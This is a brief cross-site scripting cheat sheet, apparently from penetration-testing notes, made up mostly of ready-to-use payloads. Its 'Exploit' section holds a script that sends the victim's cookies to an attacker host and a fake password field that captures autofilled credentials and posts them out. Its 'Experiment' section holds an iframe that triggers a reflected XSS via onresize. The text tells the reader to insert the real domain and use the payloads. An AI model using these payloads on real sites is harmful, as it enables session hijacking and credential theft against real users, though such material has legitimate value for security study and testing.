# Cross-Site Scripting

## 0x01 General

```
<script>alert(document.cookie)</script>
```

```
<img src=x onerror=alert(document.cookie)>
```

## 0x02 Exploit

### Steal Cookie

Replace `evil-website.com` in the code with the actual domain

```
<script>
fetch("https://evil-website.com", {
  method: "POST",
  mode: "no-cors",
  body: JSON.stringify({ cookie: document.cookie }),
});
</script>
```

### Steal Password

* Only for users who have enabled autofill passwords
* Replace `evil-website.com` in the code with the actual domain

```
<input name="username" id="username" />
<input
    name="password"
    id="password"
    type="password"
    onchange="if(this.value.length); fetch('https://evil-website.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});"
/>
```

## 0x03 Experiment

### `onresize` event (GET)

* You need to start an HTTP service for the victim to access
* Replace `vulnerable-website.com` in the code with the actual domain
* Replace `<xss-parameter>` in the code with the actual parameter.
* Replace `<%3Cbody%20onresize=%22print()%22%3E>` in the code with the actual payload.
  * The decoded value is x `<body onresize="print()">`

```
<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />

<iframe
    src="https://vulnerable-website.com/?<xss-parameter>=<%3Cbody%20onresize=%22print()%22%3E>"
    onload="this.style.width='0'; this.style.height='0'"
></iframe>
```
